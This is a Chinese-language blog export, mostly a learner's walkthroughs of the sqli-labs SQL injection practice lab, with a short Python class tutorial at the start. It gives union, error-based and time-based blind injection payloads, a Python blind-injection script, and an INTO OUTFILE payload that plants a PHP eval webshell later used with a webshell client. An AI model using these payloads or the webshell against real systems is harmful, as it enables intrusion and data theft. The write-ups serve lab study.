<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Bruce = person(<span class="string">&quot;Bruce&quot;</span>, <span class="number">25</span>,<span class="number">60</span>)    <span class="comment">#实例数据属性只能通过实例访问</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;%s is %d years old&quot;</span> %(Bruce.name, Bruce.age)   )</span><br><span class="line"><span class="comment"># class instance can add new attribute </span></span><br><span class="line"><span class="comment"># &quot;gender&quot; is the instance attribute only belongs to wilber</span></span><br><span class="line">Bruce.gender = <span class="string">&quot;male&quot;</span>   <span class="comment">#在实例生成后，还可以动态添加实例数据属性，但是这些实例数据属性只属于该实例</span></span><br><span class="line">print( <span class="string">&quot;%s is %s&quot;</span> %(Bruce.name, Bruce.gender) )  </span><br><span class="line"><span class="comment"># class instance can access class attribute</span></span><br><span class="line">print( dir(Bruce))</span><br><span class="line">Bruce.hobbies.append(<span class="string">&quot;C#&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> (Bruce.hobbies)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对于类数据属性和实例数据属性，可以总结为：</p>
<p>1.类数据属性属于类本身，可以通过类名进行访问/修改<br>2.类数据属性也可以被类的所有实例访问/修改<br>3在类定义之后，可以通过类名动态添加类数据属性，新增的类属性也被类和所有实例共有<br>4实例数据属性只能通过实例访问<br>5在实例生成后，还可以动态添加实例数据属性，但是这些实例数据属性只属于该实例</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这里主要知道什么是类数据什么是实例数据，加深对类这一个概念的理解</p>
<p>参考：<a href="https://blog.csdn.net/brucewong0516/article/details/79118703">https://blog.csdn.net/brucewong0516/article/details/79118703</a></p>
<h2 id="class的访问控制"><a href="#class的访问控制" class="headerlink" title="class的访问控制"></a>class的访问控制</h2><h3 id="1、单下划线”-”"><a href="#1、单下划线”-”" class="headerlink" title="1、单下划线”_”"></a>1、单下划线”_”</h3><p>在Python中，通过单下划线”“来实现模块级别的私有化，变量除外。一般约定以单下划线””开头的函数为模块私有的，也就是说”from moduleName import * “将不会引入以单下划线”_”开头的函数。<br>现在有一个模块 example_example.py，内容用如下，模块中一个变量名和一个函数名分别以”_“开头：</p>
<h3 id="2、双下划线”-”"><a href="#2、双下划线”-”" class="headerlink" title="2、双下划线”__”"></a><strong>2、双下划线”__”</strong></h3><p>1.对于Python中的类属性，可以通过双下划线”__“来实现<strong>一定程度的私有化</strong>，因为双下划线开头的属性在运行时会被”混淆”（mangling）。</p>
<p>2.双下划线的另一个重要的目地是，避免子类对父类同名属性的冲突</p>
<p>吐槽:学的很无语，因为看的不是很懂，感觉懵懵的==</p>
<p><a href="https://blog.csdn.net/brucewong0516/article/details/79121179">https://blog.csdn.net/brucewong0516/article/details/79121179</a></p>
]]></content>
  </entry>
  <entry>
    <title>solidity智能合约学习</title>
    <url>/2021/05/01/solidity%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>sqli-labs小试</title>
    <url>/2020/10/24/sqli-labs%E5%B0%8F%E8%AF%95/</url>
    <content><![CDATA[<p>这个是第二次写这篇博客，我没想到居然忘记保存了，泪目。。</p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>首先我觉得可能要先理解一下什么是sql注入<br><strong>sql注入</strong></p>
<p>指的是，web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序事先定义好的<br>查询语句的结尾添加额外的SQL语句，在管理员不知情的情况下事先非法操作，以此实现欺骗数据库服务器执行非授权的命令。</p>
<p><strong>sql注入的类型</strong><br>1.字符型注入2.数字型注入                       <a id="more"></a></p>
<h3 id="这是一个写到第三关的补充"><a href="#这是一个写到第三关的补充" class="headerlink" title="这是一个写到第三关的补充"></a>这是一个写到第三关的补充</h3><p>我在想为什么加入一个单引号或者‘）就可以实现注入，就可以进行操作，在思考一番过后，我发现是这样的：<br>就拿第一关来说吧</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201109165739.png" alt="img"></p>
<p>当我输入的是?id=1’的时候，看这个错误代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;&#39;1&#39;&#39; LIMIT 0,1&#x2F;&#x2F;这个是我在文件里面加入的提示sql执行的语句</span><br></pre></td></tr></table></figure>

<p>当我输入and1=1后<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201109170235.png" style="zoom:50%;"></p>
<p>可以发现他的错误提示是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> use near &#39;and1&#x3D;1&#39; LIMIT 0,1&#39; at line 1</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;&#39;1&#39;and1&#x3D;1&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<h4 id="这里是来自第23关的一个更正"><a href="#这里是来自第23关的一个更正" class="headerlink" title="这里是来自第23关的一个更正"></a>这里是来自第23关的一个更正</h4><p><strong>1</strong>所以就又重新思考了一下，加上资料查找：闭合指的是双引号成对存在，所以我们看上面的语句 当我们加入了一个引号的时候，此时的引号一共是有五个的，所以必然存在一个多余的单引号，那么我们需要去掉哪个引号才不会影响我们的语句呢？</p>
<p>**2.**注释符 会将后面所有内容给注释掉 ,,,所以在这个语句中’’2’and1=1’ LIMIT 0,1’，我们先解析一下， 首尾各有一个引号，切2前面和1后面各有一个引号，这个是’$id’ 在源码中出现的两个引号，而首尾的引号是后来出现的，我们在2后多加了一个单引号后，导致引号之间不配对了，所以出现错误，这个时候我们需要将1后面的单引号，limit，这样2前面的单引号就和我们的插入的但引号配对成功了<br>那么当然也有不注释的方法：就是让所有的引号都找到自己的另一半，也就是说我们在这里多加一个单引号就可以了<br>**1.**这边有几个问题需要说一下，引号内的数据要合法，要保证连贯性，他前后是可以互相拼接的比如’=1’就不行，还有就是引号的闭合好像是有就近原则，我刚才试了一下 发现 ‘1’and 1=1’’这个就不行，可能是因为 最后两个引号直接无数据导致出错了，然后两个引号之间闭合，引号的内容会变成字符串，所以这个时候我们就无法使用order by 来查询字符段数目。因为order by需要的是数字，这个时候我们直接使用 union select尝试即可。</p>
<p><strong>这是来自后面的复习，如果要参考的看这个就够了</strong><br>关于单引号，我们知道 我们输入1’<br>代入到select查询语句是这样的： SELECT * FROM users WHERE id=’1’’ LIMIT 0,1<br>注意到1后面多了一个’，此时 是不符合语法的，因为有个单引号落空了。所以这个时候我们就有两个方案<br>1.注释掉后面的单引号 这里以#作为演示：SELECT * FROM users WHERE id=’1’#’ LIMIT 0,1此时这个语句在mysql里面是这样SELECT * FROM users WHERE id=’1’#去执行的，因为后面都被注释掉了，这个时候就符合语法，后面可以加入其它语句了再举个例子，以union联合注入为例:<br>SELECT * FROM users WHERE id=’1’union select database()#’ LIMIT 0,1 代入到mysql是这样的:<br>SELECT * FROM users WHERE id=’1’union select database()#</p>
<p>2.闭合后面单引号SELECT * FROM users WHERE id=’1’or1=1’1’ LIMIT 0,1 这个语句也是符合语法的 代入到mysql是这样的:<br>SELECT * FROM users WHERE id=’1’(查询id=1)   or 1=1(这是执行了一个永恒为真的或语句)  ‘1’(输入了一个1) LIMIT 0,1</p>
<h4 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h4><p><strong>1</strong>.根据这个题目中的get-error based-single quotes，我们就可以知道这题是单引号引起的字符型输入，所以我们直接输入?id=1。<br><strong>2</strong>.接下来我们输入一个单引号’<br><strong>3</strong>.可以发现，网页开始报错了内容是</p>
<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1<br>SELECT * FROM users WHERE id=’1’’ LIMIT 0,1  在这个当中单引号被包括进去了，但是却报错了，而当我尝试其他符号的时候，发现是可以正常显示的。接着我们用and 1=1 和and1=2来测试，</p>
<p><strong>这里补充一个知识点， and 1=1代表永恒为真， and 1=2 代表永恒为假 我们判断有没有注入的时候可以利用这点来判断，如果页面不一样，就代表我们的语句生效了，存在注入点!</strong></p>
<p>接下来我们需要知道查询表的字段数，我们才能利用<strong>union+select查询我们所需要的信息</strong><br><strong>因为 select （），（），（）， 有几个括号是要和该表的字段数所对应，</strong><br>在这里我们需要引入一个<strong>order by</strong>命令<br>在这里 order by 的作用是用来查询字段数，当你order by （一个数字）的时候，如果有这么多字段数，那么输出结果就不会报错，如果没有，就会报错<br>而我们通常会将<strong>order by 结合二分法</strong>这个时候就可以很快的查询到字段数（核心是猜）</p>
<p>知道字段数吼，并且知道我们就可以利用注入点，添加一些命令语句，获得我们想要的信息。</p>
<p>然后这里需要了解一个<strong>union</strong>命令 ：</p>
<p> <strong>两个要联合的SQL语句 字段个数必须一样，而且字段类型要一致</strong></p>
<p>这个union命令可以拼接语句，使得将两个select语句联合起来使用，这个时候我们可以让前面那个select为假使用不了，这样后面的语句就可以使用了。 </p>
<p>这个时候使用 ?id=1’ and 0 union select 1,2,3 –+ 就可以发现页面变成<img src="/.com//Users\10452\AppData\Roaming\Tencent\Users\1045225639\QQ\WinTemp\RichOle\0MZNBL~}KH$N3[WXC94CGZ0.png" alt="img" style="zoom: 50%;"></p>
<p>这个样子，说明字段2代表的是登录名一栏，字段3代表的是密码一栏</p>
<p>接下来，我们要做的就是让可以显示的这几栏我们想要的信息：<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201106212818.png" alt="img" style="zoom:50%;"></p>
<p>当我们输入select 1,database (),3 –+的时候  我们就可以得知其中数据库的名字，为security</p>
<p>紧接着，我们就可以再利用select 查询这个库名里面的表名<br>接下来我们在union后面添加 select 1,group_concat(table_name),3 from information _schema.tables where table_schema =’security’ –+  那这个时候</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201106212703.png" alt="img" style="zoom:50%;">就出现了这个数据库中的所有表名，</p>
<p>接下来我们知道了库名，知道了表名，就可以去找表中的字段名了<br>差找字段名的语句是这样的 select 1,group_concat(column_name),3 from information_schema.columns where table_schema=’security’ and table_name=’emails’–+<br>也可以直接是 select 1,group_concat(column_name),3 from information_schema.columns where  table_name=’emails’–+   </p>
<p>根据这段语句，我们就可以获得emalis这个表中的字段名</p>
 <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201106214209.png" alt="img" style="zoom:50%;">

<p>含有一个id 一个email_id 这个时候我们就爆一下字段名</p>
<p>这个时候我们使用 select 1,email_id,3 from emails –+ 就可以知道这个字段名下的数据<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201106215030.png" alt="img" style="zoom:50%;"></p>
<p>这样就大功告成了</p>
<h4 id="这个时候补充一些知识："><a href="#这个时候补充一些知识：" class="headerlink" title="这个时候补充一些知识："></a>这个时候补充一些知识：</h4><p>mysql5.0版本之后 会在数据库中存放一个information_schema的数据库，在该库，我们需要记住三个表名，分别是schemata，tables，colums</p>
<p>在schemata表中存储该用户创建的所有数据库的库名，在该表中 记录数据库库名的字段名为：schema_name</p>
<p>tables中存储该用户创建的所有数据的库名和表名，在这个表中记录数据库库名和表名的字段名分别为 table_schema和table_name</p>
<p>columns表存储该用户创建的所有数据库的库名，表名和字段名，在该表中记录数据库库名，表名和字段名的字段名为table_schema,table_name,column_name;</p>
<h4 id="group-concat（）函数"><a href="#group-concat（）函数" class="headerlink" title="group_concat（）函数"></a>group_concat（）函数</h4><p>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
<p>在我们这题中我们是用group_concat(column_name)意思是将这个表中所有字段名连接起来并返回数据。<br><a href="https://www.cnblogs.com/wang-yaz/p/10862627.html">https://www.cnblogs.com/wang-yaz/p/10862627.html</a><br>这个是参考链接</p>
]]></content>
  </entry>
  <entry>
    <title>sqlilabs 3</title>
    <url>/2020/11/16/sqlilabs-3/</url>
    <content><![CDATA[<h2 id="LESS-7"><a href="#LESS-7" class="headerlink" title="LESS-7"></a>LESS-7</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201116132900.png" alt="img" style="zoom:50%;">

<p>在这题当中，我们不难发现，这次他是对((‘$id’))做了这个处理，所以我们只需要在后面多加一个’))这个 然后在里面添加我们需要注入的语句就可以进行注入了<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201116133355.png" alt="img" style="zoom:50%;"></p>
<p>好了 成功执行，接下来我们输入我们的查询语句试试       <a id="more"></a><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201116133555.png" alt="img" style="zoom:50%;"></p>
<p>因为之前都知道他的数据库名字是security 所以我直接用substr查了，然后如果换成其他的他就会报错，好像接下来也没啥太大区别了？<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201116134638.png" alt="img" style="zoom:50%;"></p>
<p>OK  一模一样，但是我看外面那个标题 和其他的也不一样啊，</p>
<p>是叫做DUMP into outfile  即利用文件导入的方式进行注入（文件上传注入）<br>原来这么快就要使用webshall 了：安装好webshall以后，<br><a href="https://blog.csdn.net/qq_34965596/article/details/104076019?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-7.add_param_isCf&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-7.add_param_isCf%E8%BF%99%E4%B8%AA%E6%98%AFwebshall%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B">https://blog.csdn.net/qq_34965596/article/details/104076019?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-7.add_param_isCf&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-7.add_param_isCf这个是webshall的简单使用教程</a></p>
<p>我们开始使用这个文件导入的方式进行注入：<br>基础知识：<br>1.如果服务端代码卫队客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）<br>危害：<br>非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被成为<strong>webshell</strong>，也可将webshell脚本成为一种网页后门，webshell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件、执行系统命令等。<br>今天就先简单的使用一下<br><strong>select into outfile 直接写入</strong><br><strong>1.利用条件</strong><br>（1）对web目录需要有写权限能够使用单引号（root）<br>（2）知道网站绝对路径（这次由于网站直接搭载在本机下，所以可以很容易得知）<br>（3）secure_file_priv 没有具体值<br><strong>2.查看secure_file_priv值</strong><br>secure_file_priv 是用来限制 load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限。<br>当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权<br>当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权<br>当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权<br>我发现我的secure_file_priv是有值的 所以我就找到ini配置文件<a href="https://blog.csdn.net/believe_today/article/details/79223684">https://blog.csdn.net/believe_today/article/details/79223684</a> 这个是查找教程  然后将那个数值删掉 <strong>记得重启mysql，不然没用</strong><br>接下来就是使用  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select 1,2 ,&quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; into outfile &#39;D:\\apache\\www\\sqli-labs-php7-master\\Less-7\\123.php&#39; --+</span><br></pre></td></tr></table></figure>

<p>有个需要注意的点<br><strong>1</strong>这边的斜杠是两个。<br>在输入这段代码以后 出现了这两个<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201116210646.png" alt="img" style="zoom:50%;"><br>即使报错了 文件依旧生成了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201116210647.png" alt="img" style="zoom:50%;"><br>接下来就是利用菜刀工具，连接这个木马，控制文件</p>
<img src="/.com//Users\10452\Desktop\博客截图\8WF`Q}HH9%%9{Y}N@YKXGNV.png" alt="8WF`Q}HH9%%9{Y}N@YKXGNV" style="zoom:50%;">
配置是这样的 这个连接密码是那个php一句病毒的post里面的字符
点击添加即可（PS:我一直按测试连接，一直说返回值为空，我人傻了）
然后添加完以后，右键那个

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201116211258.png" alt="img" style="zoom: 67%;">
点击文件管理<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201116211420.png" alt="img" style="zoom:50%;">

<p>OK 打开新世界的大门<img src="/.com//Users\10452\Desktop\博客截图\OV_HDKHCX}TJMZ9HBHJ6LG6.png" alt="OV_HDKHCX}TJMZ9HBHJ6LG6" style="zoom:50%;"><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201116212554.png" alt="img" style="zoom:50%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201116212555.png" alt="img" style="zoom:50%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201116212556.png" alt="img" style="zoom:50%;">

<p>这里需要补充一下，接下来回到刚才添加地址的那个页面右键单击我们添加的地址，然后按数据管理，然后点击数据库，输入这些信息，记得！！！！<strong>数据库类型是mysqli（分版本的）</strong><br>ok<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201116212832.png" alt="img" style="zoom:50%;"><br>好了 数据库 一览无遗 攻击成功</p>
<h3 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h3><p><strong>1.PHP一句木马</strong><br>是这样的 eval()：<br>eval函数将接受的字符串当做代码执行<br>参数情况：<br>         （1）如果参数是一个表达式，eval() 函数将执行表达式；<br>          （2） 如果参数是Javascript语句，eval()将执行 Javascript 语句；<br><strong>注意</strong>：（如果执行结果是一个值就返回，不是就返回undefined，如果参数不是一</p>
<p>个字符串，则直接返回该参数）<br><strong>语法</strong>：eval(string)<br><strong>案例：</strong><br>eval(“var a=1”);//声明一个变量a并赋值1。<br>eval(“2+3”);//执行加运算，并返回运算值。<br>eval(“mytest()”);//执行mytest()函数。<br><strong>函数作用域</strong>：<br>eval()函数并不会创建一个新的作用域，并且它的作用域就是它所在的<br>作用域，有时候需要将eval()函数的作用域设置为全局，当然可以将eval()在全局作用<br>域中使用，这个时候可以用window.eval()的方式实现。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;hacker&#x27;</span>]);<span class="meta">?&gt;</span> <span class="comment">//解析一下这句话：hacker是密码，通过post提交数据，$_POST是超全局变量</span></span><br><span class="line"><span class="comment">//@符号的意思是不报错</span></span><br><span class="line"><span class="comment">//在写语句的时候注意 ?&lt;php 这三个之间无空格</span></span><br><span class="line">    <span class="comment">//密码有无引号问题不大</span></span><br></pre></td></tr></table></figure>

<p>将这个一句话木马写入文件上传到网站，然后打开这个这个函数好像还有其他东西没被我想到，有点怪怪的？？？ 感觉没这么简单 所以重新开了个博客整理这个文件上传注入的知识</p>
<p><strong>2.webshell</strong><br><strong>web 应用管理工具</strong>，正常情况下，运维人员可以通过 webshell 针对 web 服务器进行日常的运维管理以及系统上线更新等，那么攻击者也可以通过 webshell 来管理 web 应用服务器。</p>
<h4 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h4><p>也可直接将数据库的数据存到文档中</p>
<h2 id="LESS-8"><a href="#LESS-8" class="headerlink" title="LESS-8"></a>LESS-8</h2><p>在这个当中我们 发现他是没有报错信息的</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201116183008.png" alt="img" style="zoom:50%;">

<p>那么我们就无法使用类似之前的报错注入了。所以就需要时间注入攻击<br>这里我们就需要先了解一个<strong>sleep（）函数</strong><br>它的功能是可以让mysql的执行时间变长<br>一班和if（expr1，expr2，expr3）结合使用，此if语句含义是：如果expr1是true 则if（）的返回是expr2，否则则返回的值为expr3。<br>所以这里我们输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if（length(database()&gt;1),sleep(5),1)</span><br></pre></td></tr></table></figure>

<p>这个语句的意思就是，如果数据库名称的长度大于1,那么延迟五秒钟响应，反之查询1<br>那么我们怎么知道他的响应时间呢火狐浏览器 然后按网络即可<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201117161954.png" alt="img" style="zoom:50%;"></p>
<p>那接下来就是查询表的名字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;limit 0,1 ),1,1) &#x3D; &#39;e&#39;,sleep(5),1) --+</span><br></pre></td></tr></table></figure>

<p>接下来的步骤都很相似了</p>
<h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p>这个关和第八关还挺像的，但是这关连报错都没有，都是you are in</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119011357.png" alt="img" style="zoom:50%;">

<p>那这个时候  很明显就只能利用时间来判断是否注入了<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119011633.png" alt="img" style="zoom:50%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119011634.png" alt="img" style="zoom:50%;">

<p>因为不管是 and 1=1 还是 and1=2  画面都不会有变化，因为报错语句已经全部变成you are in了</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119011952.png" alt="img" style="zoom:50%;">

<p>一样的代码一样的测试结果，后面就不再截图了</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119122913.png" alt="img" style="zoom:50%;">

<p>用就是最后查询字段内容了</p>
<p>第十关根据标题 double quotes<br>可以知道这次需要使用双引号的注入 然后再加上时间盲注</p>
<p>那其他过程都和之前的一样 </p>
<p>整理时间盲注代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> and if(substr(database(),1,1)&#x3D;&#39;s&#39;,sleep(5),1) --+</span><br><span class="line">and if(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1)&#x3D;&#39;e&#39;,sleep(5),1) --+</span><br><span class="line">and if(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1)&gt;&#39;e&#39;,sleep(5),1) --+</span><br><span class="line">and if(substr((select email_id from emails limit 0,1),1,1)&#x3D;&#39;D&#39;,sleep(5),1) --+</span><br></pre></td></tr></table></figure>

<p>说几个需要注意的点吧，首先  是空格一定要在英文模式下打，其次 括号要分清几个，然后比如说我们要找<br>字段名 就是column_name 而column_name 是从表中也就是table_name里面找到的</p>
<p>这个要理解一下，不然一直记错很难受</p>
<p>附python时间盲注脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://localhost:81/sqli-labs-php7-master/Less-9?id=1&quot;</span></span><br><span class="line">payload_try=<span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">passwd=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payload_try:</span><br><span class="line">        payload=<span class="string">f&quot;&#x27;and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;,sleep(1),1)--+&quot;</span></span><br><span class="line">        print(payload)</span><br><span class="line">        time1=datetime.datetime.now()</span><br><span class="line">        r=s.get(url+payload)</span><br><span class="line">        time2=datetime.datetime.now()</span><br><span class="line">        sec=(time2-time1).seconds</span><br><span class="line">        <span class="keyword">if</span> sec&gt;=<span class="number">1</span>:</span><br><span class="line">           passwd+=j</span><br><span class="line">           print(passwd)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs1</title>
    <url>/2020/11/07/sqlilabs1/</url>
    <content><![CDATA[<p>在第二关中 我首先用and 1=1 和and1=2 得到的结果是不一致，说明我们的语句可以被注入使用,也即存在注入点：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201107235914.png" alt="img" style="zoom:50%;">

<p>接下来我们就要利用这个注入点输入语句了  这个是我们加个‘发现是和上一题是不一样的  <a id="more"></a></p>
<p>输入单引号，根据报错信息确定咱们输入的内容被原封不动的带入到数据库中，也可叫做<strong>数字型注入</strong>，</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201108002635.png" alt="img"></p>
<p>这个时候我们发现第二关相比第一关少了一个单引号，所以我们这题我们就无须加单引号，直接写查询代码就可以了（看看我们上面执行的and其实也就可以知道了）</p>
<p>这个时候我们还是用order by 查询他的字段数，可以发现，依旧为3；<br>然后我们使用union联合select</p>
<p>在这里发现一个神奇的事情，是不是用–+注释掉后面都可以，没啥区别</p>
<p>这边有一点我需要再明确的：<br><strong>我们是先获得数据库database()的名字，在通过数据库的名字后查询表名table_name，再知道表名之后，查询字段名column_name</strong><br>后面和前面的第一关是很类似的，就不详细说</p>
<h3 id="接下来是第三关"><a href="#接下来是第三关" class="headerlink" title="接下来是第三关"></a>接下来是第三关</h3><p>当我输入and 1=1 或者是 and1=2的时候，页面没有任何区别，所以这个和第二关不太一样，此时我们再尝试一下输入单引号 页面变成如下</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201109174647.png" alt="img" style="zoom:50%;">

<p>从错误报告中我们可以知道</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;(&#39;1&#39;&#39;) LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>这个时候我们发现 在输入单引号后，后面多了一个括号，</p>
<p>我们把use的那条补充完整，应该是<strong>use near ‘(‘1’’) LIMIT 0,1’ at line 1</strong><br>这个时候我们可以推测出这次的程序如果要执行代码应该是要（’执行内容’），所以我们尝试一下在’后面加一个括号，让整个语句变成<strong>use near  ‘(‘1’)’ ‘)  limit’  **让我尝试一下   发现他是变成这样的：<br>use near ‘’) LIMIT 0,1’ at line 1  就像我在第一关说的，（’1’） 因为已经是合法数据，所以就没出现了，符合我的猜想，我一开始说要执行代码需要</strong>（’内容’）<strong>这个格式，<br>所以我接下来便输入了：<br>?id=1’)(‘and1=1’) 并且无论是否加 –+ 都是错误的，所以我就纳闷啊，为啥呢，后来发现是要（’’）这个形式没错<br>但是，我们将语句还原回去一下</strong>use near ‘(‘(‘1’)and1=1’)’** 此时我们就可以发现其实and1=1 是（’’）这个形式了<br>在后面加上注释符，即可<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201109181733.png" alt="img" style="zoom:50%;"></p>
<p>此时我们发现，存在注入点，接下来就和前两题应该没什么区别了吧<br>让我尝试一波<br>此时有点小无语，<strong>因为没有让前面的id为假</strong>，导致我一直输出dumb，我还在想哪里出错了，无语了<br>和之前的没啥区别，就不说了哈哈哈哈<br>补充一下就是 一开始的group_concat(column_name) 这边这个table或者column是不用加s的，需要加的是information_schema.columns这边需要加，这一整个语句中就是这里需要加。<br>好像也没啥要写的，如果有的话再来补充吧</p>
<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>这个前四关都一模一样啊，我本来想第四关重新写一篇博客水一下，可是一看到题目就知道跟前三篇几乎一模一样吧？唯一不同的是这次是双引号”</p>
<p>确实一模一样，没啥好说的</p>
]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs2</title>
    <url>/2020/11/09/sqlilabs2/</url>
    <content><![CDATA[<h3 id="sqlilabs第五关"><a href="#sqlilabs第五关" class="headerlink" title="sqlilabs第五关"></a>sqlilabs第五关</h3><p>这次的和之前四关就很不一样了，虽然还是单引号的字符型注入，但是</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201112180754.png" alt="img" style="zoom:50%;">

<p>这个you are in 就很尴尬，除了报错，不然都是you are in。。。。<br>所以要怎么办呢<br>这个时候就要知道什么叫盲注了                                    <a id="more"></a><br><strong>盲注</strong>就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显 到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注</p>
<h4 id="盲注有三类"><a href="#盲注有三类" class="headerlink" title="盲注有三类"></a>盲注有三类</h4><p>•基于布尔 SQL 盲注<br>•基于时间的 SQL 盲注<br> •基于报错的 SQL 盲注<br>先从布尔sql盲注说起吧</p>
<h4 id="首先是sql注入截取字符串常用函数"><a href="#首先是sql注入截取字符串常用函数" class="headerlink" title="首先是sql注入截取字符串常用函数"></a>首先是sql注入截取字符串常用函数</h4><p><strong>首先是mid（）函数</strong><br><strong>此函数为截取字符串的一部分</strong><br><strong>语法</strong>：MID（column_name,start,[length]）</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201109201708.png" alt="img" style="zoom: 67%;">

<p>eg： str=”123456” mid(str,2,1)  结果为2</p>
<p>例子：</p>
<p>（1）MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。</p>
